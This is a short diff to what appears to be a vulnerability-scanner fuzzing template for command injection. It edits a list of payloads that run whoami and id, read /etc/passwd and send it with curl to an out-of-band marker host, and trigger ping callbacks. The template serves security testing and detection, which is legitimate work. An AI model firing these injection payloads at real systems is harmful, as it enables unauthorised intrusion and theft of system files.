@@ -43,10 +43,11 @@ requests:
         - "curl${IFS}{{marker}}?$(whoami)"
         - "%2 -n 21 {{marker}}||`ping -c {{marker}}` #' |ping -n {{marker}}||`ping -c 21 {{marker}}` #\" |ping -n {{marker}}"
         - "%0a ping -i {{marker}} %0a"
-        - "curl${IFS}{{marker}}?$(whoami)"
+        - "curl${IFS}{{marker}}?$(id)"
         - "1;system('cat%20/etc/passwd')"
         - "1;system('id')"
         - "|%20curl%20-d%20@/etc/passwd%20{{marker}}"
+        - "'.print((`id`)).'"
 
     fuzzing:
       - part: query
